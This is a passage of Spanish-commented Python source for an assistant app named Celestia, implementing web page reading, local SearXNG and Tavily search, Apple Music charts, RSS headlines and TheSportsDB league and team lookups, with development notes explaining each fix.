        r"\branking\b|\bpartido\b|\bmercado\s+de\s+fichajes\b|"
        r"\bprecio\b|\bcotiza\w*|\bcuesta\b|\bvale\b|"
        r"\bcar[oa]s?\b|\bbarat[oa]s?\b|\bcartelera\b|\bestreno\b",
        re.IGNORECASE,
    )
    # Sesión 45 — el anclaje temporal, también del revés. Pedía una señal
    # explícita de actualidad y por eso «explícame cómo está el panorama de
    # los coches eléctricos» buscó sin fecha y volvió con cifras de 2024. Se
    # ancla por defecto; la excepción es lo que de verdad no caduca: lo
    # histórico, las definiciones y los cómo-se-hace.
    _ES_ATEMPORAL_RE = re.compile(
        r"\bqui[eé]n\s+(?:descubri[oó]|invent[oó]|fund[oó]|escribi[oó]|"
        r"pint[oó]|compuso|constru[yi][oó])\b|"
        r"\ben\s+qu[eé]\s+a[ñn]o\b|"
        r"\bcu[aá]ndo\s+(?:naci[oó]|muri[oó]|se\s+fund[oó]|ocurri[oó]|"
        r"empez[oó]\s+la|termin[oó]\s+la|se\s+invent[oó])\b|"
        r"\bqu[eé]\s+(?:es|era|fue|son|significa|quiere\s+decir)\b|"
        # «quién fue» es biografía; «quién es» puede caducar (un presidente,
        # un campeón), así que ese se queda fuera de la exención a propósito.
        r"\bqui[eé]n(?:es)?\s+(?:fue|fueron|era|eran)\b|"
        r"\bc[oó]mo\s+(?:se\s+(?:hace|prepara|dice|escribe|llama)|funciona)\b|"
        r"\b(?:historia|biograf[ií]a|receta|definici[oó]n)\s+de\b|"
        # Datos de ficha de un país o lugar: no cambian de un año a otro.
        r"\b(?:capital|moneda|idioma|idiomas|bandera|himno|superficie|"
        r"gentilicio|continente)\s+(?:de|del)\b|"
        r"\bd[oó]nde\s+(?:est[aá]|queda|se\s+encuentra)\b|"
        r"\ben\s+qu[eé]\s+(?:pa[ií]s|continente|regi[oó]n)\b|"
        r"\bpor\s+qu[eé]\s+(?:el|la|los|las)\s+\w+\s+(?:es|son|tiene)\b",
        re.IGNORECASE,
    )
    _MESES_ES_BUSQUEDA = ("enero", "febrero", "marzo", "abril", "mayo", "junio",
                          "julio", "agosto", "septiembre", "octubre",
                          "noviembre", "diciembre")

    # ── Leer la página entera cuando el resumen no basta ──
    # Los buscadores devuelven dos líneas por resultado. Para «¿cuánto cuesta
    # X?» o «¿qué dijo Y?» el dato suele estar en el cuerpo del artículo, no
    # en el resumen. Con las URLs que ya trae la búsqueda se abre la página y
    # se extrae el texto — como haría cualquiera al pinchar el primer enlace.
    _MAX_PAGINA_BYTES = 1_500_000
    _CHARS_POR_PAGINA = 1200
    _pagina_cache: Dict[str, Tuple[float, str]] = {}    # TTL 30 min
    _ultimas_urls: List[str] = []                       # enlaces de la última búsqueda

    def _leer_pagina(self, url: str) -> str:
        """Texto legible de una página. Cadena vacía si no se puede."""
        if not url or not url.startswith(("http://", "https://")):
            return ""
        ahora = time.time()
        cache = self._pagina_cache.get(url)
        if cache and ahora - cache[0] < 1800:
            return cache[1]
        try:
            # Las URLs con tildes o eñes (es.wikipedia.org/wiki/Fórmula_1)
            # revientan en urllib si no se codifican antes.
            url_segura = urllib.parse.quote(url, safe=":/?#[]@!$&'()*+,;=%~")
            req = urllib.request.Request(
                url_segura, headers={"User-Agent": "Mozilla/5.0 (compatible; Celestia/1.5)",
                                     "Accept-Language": "es-ES,es;q=0.9"})
            with urllib.request.urlopen(req, timeout=6) as r:
                tipo = (r.headers.get("Content-Type") or "").lower()
                if "html" not in tipo and "text" not in tipo:
                    return ""                     # PDF, imagen, vídeo: no es para leer
                crudo = r.read(self._MAX_PAGINA_BYTES)
            codificacion = "utf-8"
            html = crudo.decode(codificacion, "replace")
        except Exception as e:
            logger.debug("No pude leer %.60s: %s", url, e)
            return ""
        try:
            from lxml import html as lxml_html
            arbol = lxml_html.fromstring(html)
            # Fuera lo que no es contenido: menús, pies, scripts, formularios.
            for tag in ("script", "style", "nav", "header", "footer", "aside",
                        "form", "noscript", "iframe", "svg"):
                for nodo in arbol.iter(tag):
                    nodo.getparent().remove(nodo) if nodo.getparent() is not None else None
            # Los párrafos SON el contenido. Quitar nav/header/footer no basta:
            # Wikipedia arma su menú con divs, y el primer intento devolvió
            # «Artículo Discusión Leer Editar Ver historial Herramientas…» en
            # vez del texto. Un menú son enlaces sueltos; un artículo, <p>.
            parrafos = [" ".join(nodo.itertext()).strip()
                        for nodo in arbol.xpath("//p")]
            # Los cortos son pies de foto, avisos de cookies y migas de pan.
            parrafos = [t for t in parrafos if len(t) > 60]
            texto = " ".join(parrafos)
            if len(texto) < 200:
                # Sin párrafos aprovechables (una ficha, una tabla de precios),
                # se recurre al cuerpo principal entero.
                cuerpo = arbol.xpath("//article") or arbol.xpath("//main") or [arbol]
                texto = " ".join(cuerpo[0].itertext())
        except Exception as e:
            logger.debug("No pude parsear %.60s: %s", url, e)
            return ""
        texto = re.sub(r"\s+", " ", texto).strip()
        # Una página que no llega a un párrafo suele ser un muro de cookies.
        if len(texto) < 200:
            return ""
        texto = texto[:self._CHARS_POR_PAGINA]
        self._pagina_cache[url] = (ahora, texto)
        return texto

    def _ampliar_leyendo_paginas(self, query: str, resumen: str) -> str:
        """Abre los primeros enlaces si el resumen no trae lo que se pedía."""
        if not self._ultimas_urls:
            return resumen
        # Sólo se abre una página cuando hace falta de verdad: si la pregunta
        # espera un número y ninguno aparece, o si el resumen se quedó corto.
        pide_cifra = bool(self._PIDE_CIFRA_RE.search(query or ""))
        falta_cifra = pide_cifra and not self._TIENE_CIFRA_RE.search(resumen or "")
        muy_corto = len((resumen or "").strip()) < 400
        # Si se pedía un número y ya está, da igual lo corto que sea el
        # resumen: la pregunta está contestada y abrir páginas sólo añadiría
        # segundos. La longitud sólo manda cuando no se pedía ninguna cifra.
        if pide_cifra:
            if not falta_cifra:
                return resumen
        elif not muy_corto:
            return resumen
        añadido = []
        for url in self._ultimas_urls[:2]:          # dos como mucho: cuesta tiempo
            texto = self._leer_pagina(url)
            if texto:
                añadido.append(texto)
            if añadido and falta_cifra and self._TIENE_CIFRA_RE.search(añadido[-1]):
                break                                # ya tenemos el dato
        if not añadido:
            return resumen
        logger.info("Resumen insuficiente — leídas %d página(s) completas", len(añadido))
        return (resumen + "\n" + "\n".join(añadido)).strip()

    # ── SearXNG propio: buscar sin cuotas y sin depender de nadie ──
    # El usuario quería «pagar una vez y tenerlo para siempre». Las APIs
    # comerciales no lo ofrecen, pero un metabuscador propio sale mejor: cero
    # cuotas, cero claves, y consulta Google, Bing, Wikipedia y compañía a la
    # vez en lugar de sólo DuckDuckGo — que es la raíz de la mitad de los
    # fallos de esta sesión, porque devuelve el reclamo SEO en vez del dato.
    # Se activa con CELESTIA_SEARXNG_URL. Sin ella, se mira si hay uno
    # encendido en el sitio de siempre (127.0.0.1:8888): Enzo, 4 oct 2026,
    # «si en mi móvil está encendido mi SearXNG de Termux, que la app lo use
    # primero». La app y Termux comparten el 127.0.0.1 del móvil. Se pregunta
    # una vez cada 5 minutos, con medio segundo de espera como mucho.
    # CELESTIA_SEARXNG_URL=0 lo apaga del todo.
    _SEARXNG_LOCAL = "http://127.0.0.1:8888"
    _searxng_local: Dict[str, float] = {"visto": 0.0, "vivo": 0.0}

    @classmethod
    def _url_searxng(cls) -> str:
        fijada = os.environ.get("CELESTIA_SEARXNG_URL", "").strip().rstrip("/")
        if fijada == "0":
            return ""
        if fijada:
            return fijada
        if os.environ.get("CELESTIA_EN_TESTS"):
            return ""
        estado = cls._searxng_local
        if time.time() - estado["visto"] > 300:
            estado["visto"] = time.time()
            try:
                with urllib.request.urlopen(f"{cls._SEARXNG_LOCAL}/healthz", timeout=0.5) as r:
                    estado["vivo"] = 1.0 if r.status == 200 else 0.0
            except Exception:
                estado["vivo"] = 0.0
            if estado["vivo"]:
                logger.info("SearXNG local encontrado en %s: busco con él", cls._SEARXNG_LOCAL)
        return cls._SEARXNG_LOCAL if estado["vivo"] else ""

    def _searxng(self, query: str) -> str:
        """Metabuscador propio. Cadena vacía si no está configurado o falla."""
        base = self._url_searxng()
        if not base:
            return ""
        params = urllib.parse.urlencode({
            "q": query,
            "format": "json",
            "language": "es",
            "safesearch": "0",
        })
        try:
            req = urllib.request.Request(
                f"{base}/search?{params}",
                headers={"User-Agent": "Celestia/1.5",
                         "Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=12) as r:
                datos = json.loads(r.read().decode("utf-8"))
        except Exception as e:
            logger.info("SearXNG no respondió (%s) — sigue la cadena", e)
            return ""
        filas = []
        # La «respuesta directa» de SearXNG (calculadora, conversiones, fichas)
        # va primero: suele ser exactamente el dato que se preguntaba.
        for ans in (datos.get("answers") or [])[:2]:
            texto = ans if isinstance(ans, str) else (ans.get("answer") or "")
            if texto:
                filas.append(str(texto).strip())
        if datos.get("infoboxes"):
            info = datos["infoboxes"][0]
            if info.get("content"):
                filas.append(str(info["content"]).strip())
        self._ultimas_urls = [r.get("url") for r in (datos.get("results") or [])[:5]
                              if r.get("url")]
        # Sesión 74: la dirección de cada resultado viaja con él. Sin ella, el
        # modelo que quería dar un enlace se lo inventaba («gokarts<pueblo>.com»)
        # y no había con qué comprobarlo. Se pega DESPUÉS de ordenar: los
        # números de una URL no son la cifra que se busca.
        url_de: Dict[str, str] = {}
        for res in (datos.get("results") or [])[:8]:
            titulo = (res.get("title") or "").strip()
            cuerpo = (res.get("content") or "").strip()
            fila = f"{titulo} — {cuerpo}" if (cuerpo and titulo) else (titulo or cuerpo)
            if not fila:
                continue
            filas.append(fila)
            if res.get("url"):
                url_de[fila] = str(res["url"]).split("?")[0][:120]
        if not filas:
            return ""
        logger.info("SearXNG respondió (%d bloques)", len(filas))
        return "\n".join(f"{f} ({url_de[f]})" if f in url_de else f
                         for f in self._primero_los_que_traen_el_dato(query, filas))

    # ── Tavily: refuerzo opcional cuando la búsqueda normal no trae el dato ──
    # DuckDuckGo devuelve el resumen SEO de la página; Tavily devuelve el
    # CONTENIDO extraído, que es justo lo que falta cuando la cifra está en
    # mitad del artículo. Es de pago por uso con 1.000 consultas al mes
    # gratis (agosto 2026, sin tarjeta), así que NO se usa para todo: entra
    # sólo si la cadena gratuita se ha quedado sin nada útil. Sin
    # TAVILY_API_KEY en el entorno, este bloque no existe.
    _TAVILY_URL = "https://api.tavily.com/search"

    @staticmethod
    def _clave_tavily() -> str:
        return os.environ.get("TAVILY_API_KEY", "").strip()

    def _tavily(self, query: str) -> str:
        """Búsqueda con contenido extraído. Vacío si no hay clave o falla."""
        clave = self._clave_tavily()
        if not clave:
            return ""
        # Si la pregunta pide actualidad, se le pide a Tavily el modo noticias
        # acotado a la última semana; si no, búsqueda general.
        es_actualidad = bool(self._PIDE_ACTUALIDAD_RE.search(query or ""))
        cuerpo = {
            "query": query,
            "max_results": 5,
            "search_depth": "basic",       # «advanced» cuesta el doble de créditos
            "include_answer": True,        # resumen ya redactado por Tavily
        }
        if es_actualidad:
            cuerpo["topic"] = "news"
            cuerpo["days"] = 7
        try:
            req = urllib.request.Request(
                self._TAVILY_URL,
                data=json.dumps(cuerpo).encode(),
                headers={"Content-Type": "application/json",
                         "Authorization": f"Bearer {clave}",
                         "User-Agent": "Celestia/1.5"},
                method="POST")
            with urllib.request.urlopen(req, timeout=12) as r:
                datos = json.loads(r.read().decode("utf-8"))
        except Exception as e:
            logger.info("Tavily no respondió (%s) — sigue la cadena gratuita", e)
            return ""
        partes = []
        if datos.get("answer"):
            partes.append(str(datos["answer"]).strip())
        for res in (datos.get("results") or [])[:5]:
            titulo = (res.get("title") or "").strip()
            contenido = (res.get("content") or "").strip()
            if contenido:
                partes.append(f"{titulo} — {contenido}" if titulo else contenido)
        if not partes:
            return ""
        logger.info("Tavily respondió (%s)", "noticias" if es_actualidad else "general")
        return "\n".join(partes)

    # ── Música: qué se escucha de verdad, no «los artistas de moda» ──
    # «¿Qué canción está sonando más ahora?» devolvía una lista de artistas
    # conocidos sin una sola canción. El feed público de Apple da el top real
    # del día, por país y sin clave.
    _MUSICA_RE = re.compile(
        r"\b(?:canci[oó]n|canciones|tema|temas|[aá]lbum|[aá]lbumes|disco|"
        r"m[uú]sica|hit|hits|lista\s+de\s+[eé]xitos|top\s+musical|"
        r"suena|sonando|se\s+escucha)\b",
        re.IGNORECASE,
    )
    _MUSICA_ACTUAL_RE = re.compile(
        r"\b(?:ahora|actual(?:es|mente)?|hoy|[uú]ltim[oa]s?|m[aá]s\s+"
        r"(?:escuchad|son|vendid|popular)\w*|top|nuevo|nuevos|novedades|"
        r"tendencia|de\s+moda|pet[aá]ndolo)\b",
        re.IGNORECASE,
    )
    _APPLE_RSS = "https://rss.marketingtools.apple.com/api/v2"
    _musica_cache: Dict[str, Tuple[float, str]] = {}   # TTL 1 h

    def _musica_top(self, query: str) -> str:
        """Top de canciones o álbumes del día. Vacío si no viene a cuento."""
        q = query or ""
        if not (self._MUSICA_RE.search(q) and self._MUSICA_ACTUAL_RE.search(q)):
            return ""
        # Álbumes sólo si se piden: por defecto la gente pregunta por canciones.
        tipo = ("albums", "álbumes") if re.search(r"[aá]lbum|disco", q, re.I) \
            else ("songs", "canciones")
        pais = "es"
        clave = f"{pais}:{tipo[0]}"
        ahora = time.time()
        cache = self._musica_cache.get(clave)
        if cache and ahora - cache[0] < 3600:
            return cache[1]
        try:
            req = urllib.request.Request(
                f"{self._APPLE_RSS}/{pais}/music/most-played/10/{tipo[0]}.json",
                headers={"User-Agent": "Celestia/1.5"})
            with urllib.request.urlopen(req, timeout=8) as r:
                datos = json.loads(r.read().decode("utf-8"))
        except Exception as e:
            logger.debug("Top musical falló: %s", e)
            return ""
        feed = datos.get("feed") or {}
        filas = [f"{i}. {x.get('name')} — {x.get('artistName')}"
                 for i, x in enumerate(feed.get("results") or [], 1)]
        if not filas:
            return ""
        salida = (f"Top {tipo[1]} más escuchadas en España ahora mismo "
                  f"(Apple Music, actualizado {feed.get('updated', 'hoy')}):\n"
                  + "\n".join(filas))
        self._musica_cache[clave] = (ahora, salida)
        return salida

    # ── Actualidad general: los titulares de hoy, no lo que indexó el buscador ──
    # «¿Qué ha pasado hoy en el mundo?» devolvía unos terremotos del 15 de
    # agosto estando a 27: el buscador da lo que tiene indexado, no lo de hoy.
    # Los RSS de los periódicos sí son del día, y ya estaban implementados en
    # `noticias()` — sólo faltaba enrutar estas preguntas hacia ahí.
    _NOTICIAS_GENERALES_RE = re.compile(
        r"\bqu[eé]\s+(?:ha\s+pasado|est[aá]\s+pasando|hay\s+de\s+nuevo|"
        r"se\s+cuenta)\b|"
        r"\b(?:[uú]ltimas\s+noticias|noticias\s+de\s+(?:hoy|actualidad)|"
        r"titulares|actualidad|ponme\s+al\s+d[ií]a)\b|"
        r"\bqu[eé]\s+tal\s+(?:va\s+)?el\s+mundo\b",
        re.IGNORECASE,
    )

    def _titulares_del_dia(self, query: str) -> str:
        """Titulares de hoy por RSS. Cadena vacía si la pregunta no los pide."""
        if not self._NOTICIAS_GENERALES_RE.search(query or ""):
            return ""
        # Un tema concreto («qué ha pasado con Rockstar») ya lo resuelve mejor
        # la búsqueda: aquí sólo entran las preguntas de actualidad general.
        if re.search(r"\b(?:con|de|sobre)\s+[A-ZÁÉÍÓÚÑ]", query or ""):
            return ""
        try:
            return self.noticias("", max_titulares=6)
        except Exception as e:
            logger.debug("Titulares del día fallaron: %s", e)
            return ""

    # ── Deportes: la clasificación, no la web que la publica ──
    # Mismo problema que las cotizaciones: DuckDuckGo devolvía «Consulta la
    # tabla de LaLiga en nuestra web» sin un solo dato, y Wikipedia sacaba un
    # torneo de hace siete años. TheSportsDB es pública y su clave de
    # demostración («3») basta para clasificaciones y calendarios.
    _SPORTSDB = "https://www.thesportsdb.com/api/v1/json/3"
    _CONTEXTO_DEPORTIVO_RE = re.compile(
        r"\b(?:clasificaci[oó]n|tabla|liga|jornada|partido|partidos|juega|"
        r"jug[oó]|marcador|resultado|resultados|gol|goles|temporada|"
        r"campeonato|f[uú]tbol|futbol|puntos|l[ií]der)\b"
        # «¿cómo va el Betis?» no lleva ninguna palabra deportiva: el nombre
        # del equipo ES el contexto. Se deja pasar y que decida la API — si no
        # es un equipo, devuelve vacío y la cadena sigue. Con las tablas
        # cacheadas, equivocarse no cuesta nada.
        r"|(?:c[oó]mo|qu[eé]\s+tal)\s+(?:le\s+)?(?:va|van|anda)\b"
        r"|\bcu[aá]ndo\s+juega\b",
        re.IGNORECASE,
    )
    _LIGAS_CONOCIDAS = (
        (r"laliga|la\s+liga|primera\s+divisi[oó]n|liga\s+espa[ñn]ola", "4335", "LaLiga"),
        (r"premier", "4328", "Premier League"),
        (r"serie\s+a", "4332", "Serie A"),
        (r"bundesliga", "4331", "Bundesliga"),
        (r"ligue\s*1", "4334", "Ligue 1"),
        (r"champions", "4480", "Champions League"),
        # Sesión 45 — más allá del fútbol: la misma API cubre estas ligas.
        (r"\bnba\b|baloncesto", "4387", "NBA"),
        (r"\bf[oó]rmula\s*1\b|\bf1\b|gran\s+premio", "4370", "Fórmula 1"),
        (r"\bnfl\b|f[uú]tbol\s+americano", "4391", "NFL"),
        (r"\bnhl\b|hockey", "4380", "NHL"),
        (r"\bmlb\b|b[eé]isbol|beisbol", "4424", "MLB"),
    )
    # Palabras que nunca son el nombre de un equipo, para no preguntarle a la
    # API por «temporada» o por «va».
    _VACIAS_DEPORTE = {
        "como", "cómo", "que", "qué", "cual", "cuál", "quien", "quién", "va",
        "van", "esta", "está", "este", "el", "la", "los", "las", "de", "del",
        "en", "y", "a", "un", "una", "temporada", "liga", "clasificacion",
        "clasificación", "tabla", "partido", "partidos", "juega", "jugo",
        "jugó", "resultado", "resultados", "marcador", "puntos", "futbol",
        "fútbol", "campeonato", "jornada", "proximo", "próximo", "ultimo",
        "último", "cuando", "cuándo", "dime", "cuentame", "cuéntame", "me",
        "se", "lo", "al", "por", "con", "hoy", "ahora", "mismo", "ganó", "gano",
        "tal", "anda", "andan", "van", "esta", "estan", "están", "temporada",
        # 26 sep 2026: «busca en internet quién ganó el último mundial de
        # baloncesto» preguntó a la API por «busca» e «internet» —18 s en
        # total— y contestó con el Baloncesto León, desaparecido.
        "busca", "buscar", "búscame", "buscame", "internet", "google",
        "ganador", "campeón", "campeon", "quién", "quien",
    }
    # Palabras de deporte o de torneo: forman parte de nombres reales («Hockey
    # Club Milano», revisión de Codex), así que la frase entera las conserva;
    # lo que no se hace es probarlas SUELTAS como si fueran un equipo.
    _GENERICAS_DEPORTE = {
        "mundial", "copa", "baloncesto", "basket", "tenis", "balonmano",
        "voleibol", "hockey", "deporte", "deportes", "final", "torneo", "equipo",
    }
    # Preguntar quién ganó un torneo (el Mundial, la Eurocopa, Wimbledon) no es
    # una clasificación de liga ni la situación de un equipo: está en las
    # noticias. «¿Cuándo juega el Bayern en el Mundial de Clubes?» sí sigue
    # por la API: sólo se desvía si se pide el ganador o el resultado.
    _TORNEO_RE = re.compile(
        r"\b(?:mundial(?:es)?|copa\s+del\s+mundo|eurocopa|eurobasket|"
        r"copa\s+am[eé]rica|juegos\s+ol[ií]mpicos|olimpiadas?|torneo|"
        r"roland\s+garros|wimbledon|us\s+open|open\s+de\s+australia)\b",
        re.IGNORECASE)
    _PIDE_GANADOR_RE = re.compile(
        r"\b(?:gan[oó]|ganaron|ganador(?:es|a)?|campe[oó]n(?:es|a)?|"
        r"result(?:ado|ados)|medall(?:a|as|ero)|qui[eé]n\s+se\s+llev[oó])\b",
        re.IGNORECASE)
    # Tope para buscar equipos por nombre, que va palabra a palabra.
    _TOPE_EQUIPO_SEG = 6.0
    _deporte_cache: Dict[str, Tuple[float, str]] = {}   # TTL 10 min
    _tabla_cache: Dict[str, Tuple[float, list]] = {}    # clasificaciones, TTL 10 min
    _temporada_cache: Dict[str, Tuple[float, str]] = {}  # temporada en curso, TTL 1 h

    def _sportsdb(self, ruta: str) -> dict:
        """Consulta a TheSportsDB con un reintento.

        Un fallo de red suelto dejaba la respuesta a medias y el modelo lo
        traducía por «no tengo datos»: el estado de la NBA salió con 157 de
        sus 263 caracteres porque una de las tres llamadas se perdió.
        """
        ultimo = None
        for intento in (1, 2):
            try:
                req = urllib.request.Request(f"{self._SPORTSDB}/{ruta}",
                                             headers={"User-Agent": "Celestia/1.5"})
                with urllib.request.urlopen(req, timeout=8) as r:
                    return json.loads(r.read().decode("utf-8"))
            except Exception as e:
                ultimo = e
                if intento == 1:
                    time.sleep(0.4)
        raise ultimo if ultimo else RuntimeError("sportsdb sin respuesta")

    @staticmethod
    def _temporada_actual() -> str:
        """Las ligas europeas van de verano a primavera: 2026-2027."""
        hoy = datetime.now()
        return f"{hoy.year}-{hoy.year + 1}" if hoy.month >= 7 else f"{hoy.year - 1}-{hoy.year}"

    def _deportes_directo(self, query: str) -> str:
        """Clasificación de una liga o situación de un equipo. Vacío si no aplica."""
        q = (query or "").strip()
        # Nombrar una competición («NBA», «Fórmula 1») ya es contexto
        # deportivo: no hace falta que además diga «partido» o «liga».
        nombra_competicion = any(re.search(patron, q, re.I)
                                 for patron, _, _ in self._LIGAS_CONOCIDAS)
        if not (nombra_competicion or self._CONTEXTO_DEPORTIVO_RE.search(q)):
            return ""
        if self._TORNEO_RE.search(q) and self._PIDE_GANADOR_RE.search(q):
            return ""
        clave = q.lower()
        ahora = time.time()
        self._respuesta_parcial = False
        cache = self._deporte_cache.get(clave)
        if cache and ahora - cache[0] < 600:
            return cache[1]
        try:
            salida = self._tabla_de_liga(q) or self._situacion_de_equipo(q)
        except Exception as e:
            logger.debug("Consulta deportiva directa falló: %s", e)
            return ""
        parcial = self._respuesta_parcial
        # Se cachea también el «aquí no hay nada»: sin esto, cada «¿cómo va el
        # turismo?» volvería a recorrer las seis ligas. Lo que no se cachea es
        # una respuesta incompleta por un fallo de red.
        if not parcial:
            self._deporte_cache[clave] = (ahora, salida)
        return salida

    # La rama de clasificación sólo entra si se pide una clasificación:
    # «¿quién ganó el último Gran Premio?» menciona una competición conocida
    # pero quiere un resultado, y contestarle «no hay tabla publicada» sería
    # peor que dejar que lo resuelva la búsqueda.
    _PIDE_CLASIFICACION_RE = re.compile(
        r"\b(?:clasificaci[oó]n|tabla|posiciones|standings|l[ií]der|"
        r"va\s+(?:primero|l[ií]der)|c[oó]mo\s+van|puntos)\b", re.IGNORECASE)

    def _tabla_de_liga(self, q: str) -> str:
        if not self._PIDE_CLASIFICACION_RE.search(q):
            return ""
        liga = next(((idl, nombre) for patron, idl, nombre in self._LIGAS_CONOCIDAS
                     if re.search(patron, q, re.I)), None)
        if not liga:
            return ""
        idl, nombre = liga
        # La temporada la dice la propia API: calcularla por la fecha vale
        # para el fútbol europeo, pero la NBA, la NFL y la F1 tienen otros
        # calendarios.
        temporada = self._temporada_de_liga(idl) or self._temporada_actual()
        try:
            tabla = (self._sportsdb(f"lookuptable.php?l={idl}&s={temporada}").get("table") or [])
        except Exception:
            tabla = []
        if not tabla:
            # Sin tabla no significa «no sé»: normalmente es que la temporada
            # aún no ha empezado, y eso es justo lo que hay que contestar.
            # Caso real: «¿quién va líder en la NBA?» en agosto.
            return self._estado_de_temporada(idl, nombre, temporada)
        filas = [f"{e.get('intRank')}. {e.get('strTeam')} — {e.get('intPoints')} pts "
                 f"({e.get('intPlayed')} jugados, {e.get('intWin')}G "
                 f"{e.get('intDraw')}E {e.get('intLoss')}P)"
                 for e in tabla[:8]]
        return (f"Clasificación de {nombre} {temporada} a día de hoy "
                f"(fuente: TheSportsDB):\n" + "\n".join(filas))

    def _temporada_de_liga(self, idl: str) -> str:
        """Temporada en curso según la propia API (cacheada con la tabla)."""
        cache = self._temporada_cache.get(idl)
        ahora = time.time()
        if cache and ahora - cache[0] < 3600:
            return cache[1]
        try:
            ficha = (self._sportsdb(f"lookupleague.php?id={idl}").get("leagues") or [])
        except Exception:
            return ""
        temporada = (ficha[0].get("strCurrentSeason") or "") if ficha else ""
        self._temporada_cache[idl] = (ahora, temporada)
        return temporada

    def _estado_de_temporada(self, idl: str, nombre: str, temporada: str) -> str:
        """Qué contar cuando aún no hay clasificación: cuándo arranca y qué
        fue lo último que se jugó."""
        partes = [f"La temporada {temporada} de {nombre} todavía no tiene "
                  f"clasificación publicada."]
        try:
            prox = (self._sportsdb(f"eventsnextleague.php?id={idl}").get("events") or [])
            if prox:
                p = prox[0]
                partes.append(f"El próximo encuentro es {p.get('strEvent')}, "
                              f"{self._fecha_legible(p.get('dateEvent'))}.")
        except Exception:
            pass
        try:
            ult = (self._sportsdb(f"eventspastleague.php?id={idl}").get("events") or [])
            if ult:
                u = ult[0]
                marcador = ""
                if u.get("intHomeScore") not in (None, ""):
                    marcador = f" ({u.get('intHomeScore')}-{u.get('intAwayScore')})"
                partes.append(f"Lo último disputado fue {u.get('strEvent')}"
                              f"{marcador}, {self._fecha_legible(u.get('dateEvent'))}.")
        except Exception:
            pass
        if len(partes) == 1:
            return ""
        # Si falta alguna de las dos mitades (un fallo de red suelto), la
        # respuesta va coja: se devuelve igual —mejor eso que nada— pero se
        # marca para no cachearla y que el siguiente intento salga completo.
        self._respuesta_parcial = len(partes) < 3
        return " ".join(partes) + " (fuente: TheSportsDB)"

    def _situacion_de_equipo(self, q: str) -> str:
        candidatas = [p for p in re.findall(r"[\wÁÉÍÓÚÑáéíóúñ]{3,}", q)
                      if p.lower() not in self._VACIAS_DEPORTE]
        if not candidatas:
            return ""
        # La frase entera primero (con «hockey» si lo lleva), y luego cada
        # palabra suelta que pueda ser un nombre por sí sola.
        sueltas = [p for p in candidatas if p.lower() not in self._GENERICAS_DEPORTE]
        probar = list(dict.fromkeys([" ".join(candidatas), *sueltas]))
        # El tope cubre los DOS bucles: el de las tablas también llama a la API
        # (revisión de Codex: empezar después dejaba fuera la parte lenta).
        limite = time.monotonic() + self._TOPE_EQUIPO_SEG
        quiere_femenino = bool(re.search(r"\bfemenin|\bfemen[ií]\b", q, re.I))
        # Las ligas grandes van PRIMERO. Buscar por nombre en la API devuelve
        # cualquier cosa que se parezca: «Atlético» daba el Atlético CP de la
        # tercera portuguesa, y «Madrid» el Madrid CFF. Buscar el término
        # dentro de las clasificaciones reales acierta sin necesidad de una
        # lista de equipos escrita a mano, que es justo lo que no queremos.
        for nombre in probar:
            if time.monotonic() > limite:
                break
            equipo = self._equipo_en_las_tablas(nombre)
            if equipo:
                return self._resumen_equipo(equipo)
        # Fuera de las ligas grandes (un equipo modesto, otro deporte), la
        # búsqueda por nombre sigue siendo la única vía.
        for nombre in probar:
            if time.monotonic() > limite:
                logger.info("Equipo sin encontrar en %.0f s — lo resuelve el buscador",
                            self._TOPE_EQUIPO_SEG)
                break
            try:
                datos = self._sportsdb(
                    f"searchteams.php?t={urllib.parse.quote(nombre)}")
            except Exception:
                continue
            # El nombre devuelto tiene que contener el término como PALABRA:
            # buscar «tal» (de «qué tal va…») devolvía el «Talsi» de una liga
            # letona.
            equipos = [e for e in (datos.get("teams") or [])
                       if (quiere_femenino or e.get("strGender") != "Female")
                       and re.search(rf"\b{re.escape(nombre)}\b",
                                     e.get("strTeam") or "", re.I)]
            if equipos:
                return self._resumen_equipo(equipos[0])
        return ""

    def _tabla_cacheada(self, idl: str) -> list:
        """Clasificación de una liga, cacheada 10 min: se consulta hasta seis
        veces por pregunta al desambiguar un equipo."""
        ahora = time.time()
        cache = self._tabla_cache.get(idl)
        if cache and ahora - cache[0] < 600:
            return cache[1]
        try:
            tabla = (self._sportsdb(
                f"lookuptable.php?l={idl}&s={self._temporada_actual()}").get("table") or [])
        except Exception:
            return []
        self._tabla_cache[idl] = (ahora, tabla)
        return tabla

    def _equipo_en_las_tablas(self, termino: str) -> Optional[dict]:
        """Busca el término entre los equipos de las ligas grandes."""
        termino = termino.strip().lower()
        if len(termino) < 3:
            return None
        for _, idl, _ in self._LIGAS_CONOCIDAS:
            tabla = self._tabla_cacheada(idl)
            if not tabla:
                continue
            # Coincidencia exacta primero; si no, el mejor clasificado que lo
            # contenga (la tabla ya viene ordenada por posición).
            exacto = [e for e in tabla if (e.get("strTeam") or "").lower() == termino]
            contiene = [e for e in tabla
                        if re.search(rf"\b{re.escape(termino)}\b",
                                     (e.get("strTeam") or ""), re.I)]
            elegido = (exacto or contiene)
            if elegido:
                idt = elegido[0].get("idTeam")
                try:
                    ficha = (self._sportsdb(f"lookupteam.php?id={idt}").get("teams") or [])
                    if ficha:
                        return ficha[0]
                except Exception:
                    pass
                return {"idTeam": idt, "strTeam": elegido[0].get("strTeam"),
                        "strLeague": elegido[0].get("strLeague")}
        return None

    @staticmethod
    def _fecha_legible(iso: str) -> str:
        """«2026-08-26» → «ayer (26 de agosto)».

        Con la fecha en crudo el modelo se lía: dio por hoy un partido de
        ayer. Dándosela ya interpretada no hay nada que deducir.
        """
        meses = ("enero", "febrero", "marzo", "abril", "mayo", "junio", "julio",
                 "agosto", "septiembre", "octubre", "noviembre", "diciembre")
        try:
            from zoneinfo import ZoneInfo
            hoy = datetime.now(ZoneInfo(os.environ.get("CELESTIA_TZ", "Europe/Madrid"))).date()
            d = datetime.strptime(iso, "%Y-%m-%d").date()
        except Exception:
            return iso or ""
        texto = f"{d.day} de {meses[d.month - 1]}"
        dias = (d - hoy).days
        if dias == 0:
            return f"hoy ({texto})"
        if dias == -1:
            return f"ayer ({texto})"
        if dias == 1:
            return f"mañana ({texto})"
        return f"el {texto}" if dias > 0 else f"el {texto} pasado"

    def _resumen_equipo(self, equipo: dict) -> str:
        idt, nombre = equipo.get("idTeam"), equipo.get("strTeam")
        partes = [f"{nombre} ({equipo.get('strLeague', '')}) a día de hoy:"]
        try:
            ult = (self._sportsdb(f"eventslast.php?id={idt}").get("results") or [])
            for e in ult[:3]:
                partes.append(
                    f"- {self._fecha_legible(e.get('dateEvent'))}: {e.get('strEvent')} → "
                    f"{e.get('intHomeScore')}-{e.get('intAwayScore')}")
